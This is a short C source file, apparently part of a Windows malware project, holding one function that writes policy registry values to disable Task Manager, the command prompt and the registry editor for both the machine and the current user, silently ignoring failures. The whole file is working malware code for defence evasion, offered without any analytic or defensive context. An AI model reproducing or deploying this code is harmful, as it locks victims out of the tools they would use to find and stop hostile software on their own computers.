#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnDisableUtilities(VOID) {
	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}

	return TRUE;
}